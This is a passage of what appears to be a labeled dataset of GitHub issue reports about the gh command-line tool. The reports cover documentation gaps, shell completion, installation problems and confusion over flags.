script.\r\n\r\n**Potential solution:** running `gh completion` without arguments should show the same output as `gh help completion`. To obtain the script, the user would have to explicitly select a shell type, e.g. `-s bash`.\r\n\r\nFollowup to #591"},{"labels":["documentation"],"text":"**Problem:** viewing `gh help` output alphabetically sorts available commands, which currently displays arguably less interesting commands first and more interesting commands last.\r\n\r\n**Potential solution:** split commands into topic groups, similar to how `git help` does.\r\n\r\nBefore:\r\n```\r\nAvailable Commands:\r\n  completion  Generate shell completion scripts\r\n  help        Help about any command\r\n  issue       Create and view issues\r\n  pr          Create, view, and checkout pull requests\r\n  repo        Create, clone, fork, and view repositories\r\n```\r\n\r\nAfter (exact naming to be discussed):\r\n```\r\nCore Commands:\r\n  issue       Create and view issues\r\n  pr          Create, view, and checkout pull requests\r\n  repo        Create, clone, fork, and view repositories\r\n\r\nAncillary Commands:\r\n  completion  Generate shell completion scripts\r\n  help        Help about any command\r\n```"},{"labels":[null,"documentation"],"text":"### Describe the bug\r\n\r\nHi @mislav! Thank you for creating this. I'm trying to create the new repo via CLI, and it seems --repo is not passing the owner/repo format? It just defaults to owner/folder-name\r\n\r\nIn fact, I try to create a new repo using a different name it says repository already exists.\r\ngh version 0.6.2 (2020-03-18)\r\n\r\n\r\n### Steps to reproduce the behavior\r\n\r\n1. Go to folder `reponame`\r\n2. gh create repo --repo org/reponame\r\n3. it creates owner/reponame instead\r\n\r\n### Expected vs actual behavior\r\n\r\nIt should create a repo name under the org.\r\n\r\n### Logs\r\n\r\nDoing it twice says:\r\ngraphql error: 'Name already exists on this account'\r\n\r\nEven though there's no repo name under the org, only the local repo under my own account.\r\n"},{"labels":["documentation",null],"text":"### Describe the feature or problem you’d like to solve\r\n\r\nThe page https://cli.github.com/manual/gh_completion explains to use the completions by adding `eval \"$(gh completion)\"` to a profile file.\r\n\r\nFor PowerShell, the equivalent command is `gh completion -s powershell | iex`, which produces the following error:\r\n\r\n```powershell\r\n> gh completion -s powershell | iex\r\niex : At line:1 char:67\r\n+ Register-ArgumentCompleter -Native -CommandName 'gh' -ScriptBlock {\r\n+                                                                   ~\r\nMissing closing '}' in statement block or type definition.\r\nAt line:1 char:31\r\n+ gh completion -s powershell | iex\r\n+                               ~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : MissingEndCurlyBrace,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n```\r\n\r\n### Proposed solution\r\n\r\nExplain how to use the PowerShell completions\r\n"},{"labels":[null,"documentation",null],"text":"The global flags include: \r\n  `-R, --repo OWNER/REPO`   Select another repository using the OWNER/REPO format\r\n\r\nhowever this is unlikely to apply to most or all of the `gh repo` commands as I repo name/url is already needed to execute the command. \r\n\r\nFor instance, one would not use: `gh repo view https://github.com/cli/cli -R tierninho/yarn` as the `-R` flag would be ignored.\r\n\r\n_OSX, v0.6.1_"},{"labels":[null,"documentation",null],"text":"### Describe the bug\r\n\r\nRunning `gh pr view` or `gh pr list` causes a 500 error.\r\n\r\n### Steps to reproduce the behavior\r\n\r\n```\r\n$ gh pr view\r\nhttp error, 'https://api.github.com/graphql' failed (500): ''\r\n$ gh pr list\r\nhttp error, 'https://api.github.com/graphql' failed (500): ''\r\n$ gh --version\r\ngh version 0.5.5 (2020-02-13)\r\nhttps://github.com/cli/cli/releases/tag/v0.5.5\r\n```\r\n\r\n### Expected vs actual behavior\r\n\r\nIt works.\r\n\r\nOr if it doesn't...\r\n\r\nAdd a `--verbose`/`--debug` option perhaps to show the HTTP request/response? This may help the CLI devs know if the fault is a malformed request triggering a bug in the API or just the API being broken.\r\n\r\nEven bigger segue, but with `gh --help` I don't see an easy way to reauthenticate if that would maybe help. `gh login` or `gh auth` to redo credentials may be nice. I assume the token is stored somewhere, but it's a bit annoying to have to go fishing for it. `gh logout` to delete the token might be a good dual as well."},{"labels":["documentation",null],"text":"### Describe the bug\r\n\r\nI'm guessing that Fedora sees the latest release as a new piece of software and not an upgrade to the previously-installed version.\r\n\r\n```\r\n❯ gh --version\r\ngh version 0.5.4 (2020-02-04)\r\nhttps://github.com/cli/cli/releases/tag/v0.5.4\r\n```\r\n\r\n(BTW, my shell is telling me that `gh --version` is not exiting with `0`, not sure why not...)\r\n\r\n### Steps to reproduce the behavior\r\n\r\n1. Download latest RPM:\r\n\r\n```\r\n❯ wget https://github.com/cli/cli/releases/download/v0.5.5/gh_0.5.5_linux_386.rpm\r\n--2020-02-18 16:35:31--  https://github.com/cli/cli/releases/download/v0.5.5/gh_0.5.5_linux_386.rpm\r\nResolving github.com (github.com)... 140.82.114.3\r\nConnecting to github.com (github.com)|140.82.114.3|:443... connected.\r\nHTTP request sent, awaiting response... 302 Found\r\n..........................\r\nHTTP request sent, awaiting response... 200 OK\r\nLength: 4623126 (4.4M) [application/octet-stream]\r\nSaving to: ‘gh_0.5.5_linux_386.rpm’\r\n\r\ngh_0.5.5_linux_386.rpm                                100%[=========================================================================================================================>]   4.41M  8.59MB/s    in 0.5s    \r\n\r\n2020-02-18 16:35:38 (8.59 MB/s) - ‘gh_0.5.5_linux_386.rpm’ saved [4623126/4623126]\r\n```\r\n\r\n2. Attempt to install it:\r\n\r\n```\r\n❯ sudo dnf install ./gh_0.5.5_linux_386.rpm\r\n[sudo] password for alex: \r\nLast metadata expiration check: 0:05:42 ago on Tue 18 Feb 2020 04:30:14 PM CST.\r\nDependencies resolved.\r\n============================\r\n Package                                         Architecture                                      Version                                              Repository                                                 Size\r\n============================\r\nInstalling:\r\n gh                                              i386                                              0.5.5-1                                              @commandline                                              4.4 M\r\n\r\nTransaction Summary\r\n============================\r\nInstall  1 Package\r\n\r\nTotal size: 4.4 M\r\nInstalled size: 11 M\r\nIs this ok [y/N]: y\r\nDownloading Packages:\r\nRunning transaction check\r\nTransaction check succeeded.\r\nRunning transaction test\r\nError: Transaction test error:\r\n  file /usr/local/bin/gh from install of gh-0:0.5.5-1.i386 conflicts with file from package gh-0:0.5.4-1.x86_64\r\n```\r\n\r\n### Expected vs actual behavior\r\n\r\nUsually when upgrading packages, even those not in the package manager, `dnf` lists the new package as \"Upgrading:\", instead of \"Installing:\" Also, usually it succeeds.\r\n\r\n\r\n### System Information\r\n\r\n```\r\n❯ cat /etc/os-release\r\nNAME=Fedora\r\nVERSION=\"30 (Workstation Edition)\"\r\n```\r\n"},{"labels":["documentation"],"text":"On https://cli.github.com/manual/gh_pr_list, the \"Default behavior\" section shows an example of the `issue` command, not the `pr` command."},{"labels":["documentation"],"text":"to alleviate DNS issues we must move the pages site under the `github` org"},{"labels":["documentation"],"text":"### Describe the feature or problem you’d like to solve\r\n\r\nIt's unclear what the difference between `gh` and `hub` are, and when one would be used over the other.\r\n\r\n### Proposed solution\r\n\r\nMerge or provide a descriptive document on the differences and when one would be used vs the other.\r\n\r\n### Additional context\r\n\r\nNone.\r\n"},{"labels":["documentation",null],"text":"Currently, if I want to install the cli to the system (for example, to `/usr/local/bin`), I need to first run `make` and then manually copy the built executable into the desired location. The same scenario applies once uninstalling.\r\n\r\nIt'd be great if I could just run `sudo make install` to build + install the project, and obviously `sudo make uninstall` to uninstall it.\r\n\r\nThis would make it a little easier to package the project. For example, I'd like to add this to the [Arch User Repository](https://wiki.archlinux.org/index.php/Arch_User_Repository) as `github-cli-git`.\r\n\r\nThanks & good luck with the development of the cli!\r\n\r\n---\r\n\r\nEdit:\r\n\r\nFrom [Makefile](https://github.com/cli/cli/blob/master/Makefile#L12-L13):\r\n\r\n```make\r\nbin/gh: $(BUILD_FILES)\r\n\t@go build -ldflags \"$(LDFLAGS)\" -o \"$@\" ./cmd/gh\r\n```\r\n\r\nWould that supposedly solve my issue?\r\nI tried both\r\n\r\n```sh\r\nsudo make /usr/local/bin/\r\n```\r\n\r\nand\r\n\r\n```sh\r\nsudo make bin/gh /usr/local/bin/\r\n```\r\n\r\nbut neither worked - I just get \r\n\r\n```console\r\nmake: 'bin/gh' is up to date.\r\nmake: Nothing to be done for '/usr/local/bin/'.\r\n```\r\n\r\nAlso, the uninstall step is missing."},{"labels":["documentation"],"text":"## macOS:\r\nFor the installation, specifically macOS, we do not mention Homebrew as a prerequisite for the installation. Xcode Install Tools are also required, but Homebrew takes care of that, but perhaps because I have Xcode already?\r\n\r\nRunning `brew install github/gh/gh` without Homebrew results in `command not found` error. \r\n\r\nAlso, there is no mention of the SSH or HTTPS authentication, nor the subsequent browser authentication. \r\n\r\nI am not sure what else I am missing?\r\n\r\n## Linux:\r\nIf authenticating with a personal access token (PAT), you need to add this to your gh config.\r\n\r\n**~/.config/gh/config.yml**\r\n\r\n```\r\nyaml\r\ngithub.com:\r\n  - user: $GITHUB_USERNAME\r\n    oauth_token: $PERSONAL_ACCESS_TOKEN\r\n```\r\n\r\n## Windows:\r\nScoop...\r\n\r\n## Uninstalling \r\nDirections to do an uninstall would be great too\r\n\r\n## Minimum req's\r\nEach OS should have the following:\r\n- dependencies, prerequisites for installing \r\n- instructions for installing\r\n- instructions for authenticating\r\n- instructions for upgrading\r\n- instructions for uninstalling"},{"labels":["documentation"],"text":"### Describe the feature or problem you’d like to solve\r\n\r\nThe documentation is using the term \"flags\" and \"options\" interchangeably, but consistently in specific locations in the docs. This makes it appear that \"flags\" and \"options\" are two different concepts.\r\n\r\n<img width=\"765\" alt=\"Screen Shot 2020-01-28 at 11 24 00 AM\" src=\"https://user-images.githubusercontent.com/1038121/73297755-fcdba200-41c0-11ea-8c11-5e7f5e89eabb.png\">\r\n\r\n### Proposed solution\r\n\r\nUse one term or the other consistently in all locations. Personally, I feel that \"options\" is a more standard choice.\r\n\r\n### Additional context\r\n\r\nSee screenshot above.\r\n"},{"labels":["documentation",null],"text":"Currently we use `brew upgrade gh --fetch-HEAD` to upgrade GH, which is hard to remember and means letting the entire script run just to see the build is already installed:\r\n\r\n `Warning: github/gh/gh 0.3.5 already installed` \r\n\r\nor we end up with an upgraded build with an [unclear success message](https://github.com/github/gh-cli/issues/152).\r\n\r\nPerhaps we could mask the brew command with `gh upgrade` to keep it easier to remember and allow us to control the output?\r\n\r\nSome benefits:\r\n- If homebrew was not installed, we could inform the user with instructions. Could be platform/method specific.\r\n- If the current build was already installed, we could inform the user before the script ran\r\n- It could allow the user to switch builds if we go this route "}]